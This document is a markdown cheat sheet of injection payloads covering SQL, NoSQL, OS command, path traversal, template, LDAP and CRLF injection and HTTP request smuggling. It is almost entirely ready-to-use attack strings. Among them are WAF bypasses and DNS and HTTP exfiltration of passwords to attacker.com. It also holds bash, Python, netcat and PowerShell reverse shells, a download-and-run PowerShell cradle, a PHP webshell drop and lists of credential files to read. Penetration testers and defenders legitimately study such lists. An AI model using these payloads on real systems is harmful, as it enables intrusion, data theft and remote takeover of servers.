# Injection Attack Payloads & Bypass Techniques

## SQL Injection Payloads

### Basic Detection Probes (Universal)
```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR "1"="1
1' AND 1=1--
1' AND 1=2--
1 AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### UNION-Based Extraction

**Step 1 — Find column count:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- continue until error
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Step 2 — Find string column:**
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**Step 3 — Extract data (MySQL):**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
```

**Step 3 — Extract data (PostgreSQL):**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,string_agg(username||':'||password,',') FROM users--
```

**Step 3 — Extract data (MSSQL):**
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,name FROM master.dbo.sysdatabases--
' UNION SELECT username+':'+password,NULL FROM users--
```

**Step 3 — Extract data (Oracle):**
```sql
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT username||':'||password,NULL FROM users--
```

### Blind Boolean-Based

```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='p'--
```

### Blind Time-Based

**MySQL:**
```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
' OR IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(5),0)--
```

**PostgreSQL:**
```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users LIMIT 1)--
```

**MSSQL:**
```sql
'; WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--
' IF (SELECT TOP 1 SUBSTRING(password,1,1) FROM users)='a' WAITFOR DELAY '0:0:5'--
```

**Oracle:**
```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND (CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)=1--
```

### Error-Based Extraction

**MySQL:**
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**MSSQL:**
```sql
' AND 1=CONVERT(int,(SELECT password FROM users WHERE username='admin'))--
```

**PostgreSQL:**
```sql
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### Out-of-Band (OOB) — DNS Exfiltration

**MySQL (requires FILE privilege):**
```sql
' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share\\'))--
```

**MSSQL (xp_dirtree):**
```sql
'; EXEC master..xp_dirtree '//'+( SELECT password FROM users WHERE username='admin')+'/.attacker.com/a'--
```

**Oracle (UTL_HTTP):**
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--
```

### RCE via SQL Injection

**MySQL INTO OUTFILE (write webshell):**
```sql
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--
```

**MSSQL xp_cmdshell:**
```sql
'; EXEC xp_cmdshell 'whoami'--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/shell.ps1'')"'--
```

**PostgreSQL COPY TO/FROM:**
```sql
'; CREATE TABLE cmd_result (output text);--
'; COPY cmd_result FROM PROGRAM 'id';--
'; SELECT * FROM cmd_result;--
```

### WAF Bypass Techniques

**Case variation:**
```sql
' uNiOn SeLeCt null,null--
' UnIoN sElEcT nUlL,nUlL--
```

**Comment obfuscation:**
```sql
' UN/**/ION SEL/**/ECT null,null--
' /*!UNION*/ /*!SELECT*/ null,null--
```

**Encoding:**
```sql
' UNION%20SELECT%20null,null--
' UNION%09SELECT%09null,null--   (tab)
%27%20UNION%20SELECT%20null--
```

**Alternative whitespace:**
```sql
'%0AUNION%0ASELECT%0Anull,null--
```

**SQLi polyglots (test multiple DBs at once):**
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

---

## NoSQL Injection Payloads (MongoDB)

### Auth Bypass via Operator Injection

**JSON body attack (POST /login):**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": "x"}}
```

**URL parameter attack (GET /users?status=):**
```
?status[$ne]=inactive
?id[$gt]=0
?age[$gte]=0&age[$lte]=200
```

### Data Extraction via Regex Injection

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```
Automate with script to binary search through each character.

### $where JavaScript Injection (RCE if enabled)

```json
{"$where": "sleep(5000)"}
{"$where": "function(){var d=new Date(); do{var s=new Date();}while(s-d<5000); return true;}"}
{"$where": "this.username == 'admin' || 1==1"}
{"$where": "return true"}
```

### Aggregation Pipeline Injection

```json
[{"$match": {}}, {"$project": {"password": 1}}]
[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "users"}}]
```

---

## OS Command Injection Payloads

### Basic Detection

**Linux/Unix:**
```
;id
|id
||id
&&id
`id`
$(id)
;id;
; id ; echo done
```

**Windows:**
```
&whoami
|whoami
||whoami
&&whoami
%COMSPEC% /c whoami
```

### Blind CMDi (Out-of-Band)

**DNS-based detection:**
```bash
;nslookup `id`.attacker.com
;curl http://attacker.com/$(id)
;wget http://attacker.com/?x=$(whoami)
$(dig +short attacker.com)
```

**Time-based:**
```bash
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
```

### Reverse Shell Payloads

**Bash:**
```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
; /bin/bash -i > /dev/tcp/attacker.com/4444 0<&1 2>&1
```

**Python:**
```bash
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Netcat:**
```bash
; nc -e /bin/sh attacker.com 4444
; nc attacker.com 4444 | /bin/sh | nc attacker.com 4445
```

**PowerShell (Windows):**
```powershell
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Command Separator Cheat Sheet

| Separator | Linux | Windows | Notes |
|---|---|---|---|
| `;` | Yes | No | Runs regardless of exit code |
| `&&` | Yes | Yes | Runs if first succeeds |
| `\|\|` | Yes | Yes | Runs if first fails |
| `\|` | Yes | Yes | Pipes stdout |
| `\n` / `%0a` | Yes | Sometimes | Newline |
| `` ` `` | Yes | No | Command substitution |
| `$()` | Yes | No | Command substitution |
| `&` | Yes | Yes | Background execution |

---

## Path Traversal Payloads

### Basic Sequences

```
../
..\
..\/
../../../etc/passwd
..\..\..\windows\win.ini
```

### URL-Encoded Variations

```
%2e%2e%2f          → ../
%2e%2e/            → ../
..%2f              → ../
%2e%2e%5c          → ..\
%252e%252e%252f    → ../ (double-encoded)
..%c0%af           → ../ (overlong UTF-8)
..%c1%9c           → ..\ (overlong UTF-8)
```

### Null Byte Injection (older PHP/Perl)

```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
../../../etc/passwd\0
```

### Filter Bypass

```
....//....//....//etc/passwd    (stripped ../ becomes ../)
..././..././..././etc/passwd    (stripped ./ stays as ../)
/var/www/images/../../../etc/passwd
```

### Target Files — Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ          (may contain env vars including secrets)
/proc/self/cmdline          (running process command)
/proc/self/cwd/app.py       (symlink to current dir)
/proc/net/tcp               (open network connections)
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
~/.ssh/id_rsa
~/.bash_history
/app/.env
/app/config.py
/app/settings.py
/var/www/html/config.php
```

### Target Files — Windows

```
\windows\win.ini
\windows\system32\drivers\etc\hosts
\windows\system.ini
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\Users\Administrator\Desktop\
```

---

## SSTI Payloads

### Detection Polyglot (Test All Engines)

```
{{7*7}}            → 49 (Jinja2, Twig)
${7*7}             → 49 (FreeMarker, Java EL)
<%= 7*7 %>         → 49 (ERB/Ruby)
#{7*7}             → 49 (Pebble)
*{7*7}             → 49 (Thymeleaf)
{{7*'7'}}          → 7777777 (Jinja2) vs 49 (Twig) — distinguishes engines
```

### Jinja2 (Python) — RCE

**Config leak:**
```
{{config}}
{{config.SECRET_KEY}}
{{settings.SECRET_KEY}}
```

**OS command execution (Python 3):**
```python
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index of <class 'subprocess.Popen'> in the list, e.g. 396
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}

# Alternative via os module
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}

# lipsum function
{{lipsum.__globals__['os'].popen('id').read()}}
```

**Jinja2 sandbox escape:**
```python
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen("id").read()}}
  {% endif %}
{% endfor %}
```

### Twig (PHP) — RCE

```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{app.request.server.all|join(',')}}
```

### FreeMarker (Java) — RCE

```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java) — RCE

```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
```

### Smarty (PHP) — RCE

```
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('id')}
```

### ERB (Ruby) — RCE

```ruby
<%= 7*7 %>
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
```

---

## LDAP Injection Payloads

### Auth Bypass

```
*)(uid=*))(|(uid=*
admin)(&)
admin)(|(password=*)
*)(|(objectclass=*)
*()|%26'
admin)(!(&(1=0)
```

### Blind LDAP Injection (Enumerate Attributes)

```
admin)(|(cn=a*
admin)(|(cn=ab*
# Binary search through each character of a field value
```

### Full Filter Injection

```
Input into: (&(uid=INPUT)(userPassword=pass))
Payload:    *)(|(uid=*   →  (&(uid=*)(|(uid=*)(userPassword=pass))
```

---

## CRLF Header Injection Payloads

### Basic CRLF

```
value%0d%0aHeader: injected
value%0aHeader: injected
value%0d%0a%0d%0a<script>alert(1)</script>
```

### Response Splitting

```
/redirect?url=http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<script>alert('xss')</script>
```

### Cookie Injection via CRLF

```
username=admin%0d%0aSet-Cookie:%20admin=true
```

### Log Injection (via CRLF)

```
username=admin%0aINFO: Admin logged in as admin
username=admin\nERROR: Payment declined for user: victim
```

---

## HTTP Request Smuggling

### CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Poison next request:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggle&x=
0

GET /admin HTTP/1.1
Host: vulnerable.com
```

### TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### Obfuscated TE Header Bypasses

```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked
Transfer-encoding: chunked
X: X[\n]Transfer-Encoding: chunked
```
